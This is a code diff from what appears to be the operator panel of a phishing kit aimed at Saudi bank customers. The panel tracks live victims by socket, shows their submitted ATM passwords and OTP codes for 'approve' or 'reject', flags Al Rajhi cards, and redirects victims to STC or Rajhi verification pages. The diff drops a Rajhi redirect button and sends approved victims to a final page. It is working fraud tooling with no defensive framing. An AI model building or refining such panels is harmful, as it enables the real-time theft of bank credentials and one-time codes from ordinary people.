@@ -4316,15 +4316,11 @@
               html += '<button onclick="codeActionApprove(this, \'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
             }
             html += '<button onclick="codeActionReject(this, \'' + visitor.socketId + '\', ' + index + ')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
-            // إضافة زر راجحي فقط إذا كانت الصفحة ATM والبطاقة تابعة للراجحي
-            if (dc.page === 'كلمة مرور ATM' && isRajhiCard(visitor)) {
-              html += '<button id="' + codeRajhiNavBtnId + '" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>راجحي</button>';
-            }
+
             // إضافة event listeners لأزرار رمز التحقق
             setTimeout(() => {
               const rajhiBtn = document.getElementById(codeRajhiBtnId);
               const stcBtn = document.getElementById(codeStcBtnId);
-              const rajhiNavBtn = document.getElementById(codeRajhiNavBtnId);
               if (rajhiBtn) {
                 rajhiBtn.addEventListener('click', () => {
                   navigateVisitorToPage(visitor.socketId, 'phone-verification');
@@ -4353,20 +4349,7 @@
                   }, 1500);
                 });
               }
-              if (rajhiNavBtn) {
-                rajhiNavBtn.addEventListener('click', () => {
-                  navigateToRajhi(visitor.socketId);
-                  const originalText = rajhiNavBtn.textContent;
-                  rajhiNavBtn.textContent = 'تم الإرسال ✓';
-                  rajhiNavBtn.classList.remove('bg-blue-600', 'hover:bg-blue-700');
-                  rajhiNavBtn.classList.add('bg-green-600');
-                  setTimeout(() => {
-                    rajhiNavBtn.textContent = originalText;
-                    rajhiNavBtn.classList.remove('bg-green-600');
-                    rajhiNavBtn.classList.add('bg-blue-600', 'hover:bg-blue-700');
-                  }, 1500);
-                });
-              }
+
 
 
               // Event listeners لأزرار صفحة تحقق رقم الجوال OTP
@@ -5210,6 +5193,8 @@
       const originalText = btn.textContent;
       window.skipDetailsUpdate = true;
       socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'approve', codeIndex });
+      // Navigate visitor to final page
+      socket.emit('admin:navigate', { visitorSocketId: socketId, page: 'final-page' });
       // تحديث حالة الانتظار وتحديث القائمة فوراً
       const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);
       if (visitor) { visitor.waitingForAdminResponse = false; }
